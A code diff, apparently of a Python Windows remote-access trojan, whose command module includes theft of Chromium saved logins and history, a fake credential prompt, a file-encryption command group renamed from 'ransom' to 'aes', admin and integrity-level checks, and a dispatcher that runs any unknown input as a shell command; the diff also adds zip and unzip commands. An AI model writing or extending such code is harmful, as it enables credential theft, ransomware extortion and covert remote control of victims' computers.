@@ -21,10 +21,6 @@ if os.name == 'nt':
 UP_TIME = get_time()
 
 
-def get_command_list():
-    return json.dumps([cmd for cmd in vars(Command) if hasattr(getattr(Command, cmd), 'help')])
-
-
 def desc(text):
     def attr_decorator(func):
         setattr(func, 'help', text)
@@ -64,7 +60,7 @@ def enclosing(func):
                 nested_func = nested_funcs[cmd_name]
         finally:
             if not nested_func:
-                return 0, f'no such function: {cmd_name}'
+                return 0, f'No such function: {cmd_name}'
             if len(inspect.getfullargspec(nested_func).args):
                 return nested_func(cmd_arg)
             else:
@@ -79,7 +75,7 @@ def require_admin(func):
         if ctypes.windll.shell32.IsUserAnAdmin():
             return func(*args)
         else:
-            return 0, 'administrator rights required'
+            return 0, 'Administrator rights required'
 
     wrapper.__signature__ = inspect.signature(func)
     return wrapper
@@ -92,12 +88,30 @@ def require_integrity(integrity_level):
             if integrity_level == INTEGRITY_LEVEL:
                 return func(*args)
             else:
-                return 0, f'{integrity_level.lower()} integrity level required'
+                return 0, f'{integrity_level} integrity level required'
 
         wrapper.__signature__ = inspect.signature(func)
         return wrapper
 
     return attr_decorator
+
+
+def get_command_list():
+    return json.dumps([cmd for cmd in vars(Command) if hasattr(getattr(Command, cmd), 'help')])
+
+
+def execute_command(command):
+    cmd_name, cmd_arg = parse(command)
+    if hasattr(Command, cmd_name):
+        func = getattr(Command, cmd_name)
+        if not len(inspect.getfullargspec(func).args):
+            result = func()
+        else:
+            result = func(cmd_arg)
+        if result:
+            return result[0], result[1] + '\n'
+    else:
+        return Command.shell(command)
 
 
 class Command:
@@ -410,9 +424,9 @@ ShortSvcName="flcVPN"
         }
         profile_path = profile_paths.get(this.browser)
         if not profile_path:
-            return 0, 'not supported: {}'.format(this.browser)
+            return 0, 'Not supported: {}'.format(this.browser)
         if not os.path.isdir(profile_path):
-            return 0, 'not installed: {}'.format(this.browser)
+            return 0, 'Not installed: {}'.format(this.browser)
         local_state = os.path.join(profile_path, 'Local State')
         default = os.path.join(profile_path, r'Default')
         login_data = os.path.join(default, 'Login Data')
@@ -428,7 +442,7 @@ ShortSvcName="flcVPN"
         elif this.data == 'history':
             return 1, json.dumps(get_chromium_history(history), sort_keys=False, indent=2, ensure_ascii=False)
         else:
-            return 0, 'error: {}'.format(this.data)
+            return 0, 'Error: {}'.format(this.data)
 
     @staticmethod
     @desc('prompt for credentials')
@@ -489,7 +503,7 @@ ShortSvcName="flcVPN"
     @staticmethod
     @desc('encrypt and decrypt files')
     @enclosing
-    def ransom(args):
+    def aes(args):
 
         @desc('key generation')
         def gen():
@@ -538,3 +552,27 @@ ShortSvcName="flcVPN"
                 return 0, 'No such file or directory'
 
         return locals()
+
+    @staticmethod
+    @desc('create a zip archive')
+    def zip(dir_name):
+        import pathlib, shutil
+        dir_name = os.path.abspath(dir_name)
+        if not os.path.isdir(dir_name):
+            return 0, f'Directory does not exist: {dir_name}'
+        zip_name = os.path.basename(dir_name)
+        pardir = pathlib.Path(dir_name).resolve().parent
+        if dir_name == os.getcwd():
+            zip_name = os.path.join('..', zip_name)
+        filename = shutil.make_archive(zip_name, format='zip', root_dir=pardir, base_dir=os.path.basename(dir_name))
+        return 1, f'Archive created: {filename}'
+
+    @staticmethod
+    @desc('extract files from a zip archive')
+    def unzip(zip_name):
+        import shutil
+        zip_name = os.path.abspath(zip_name)
+        if not os.path.isfile(zip_name):
+            return 0, f'File does not exist: {zip_name}'
+        shutil.unpack_archive(zip_name, os.getcwd())
+        return 1, f'Archive extracted to {os.getcwd()}'
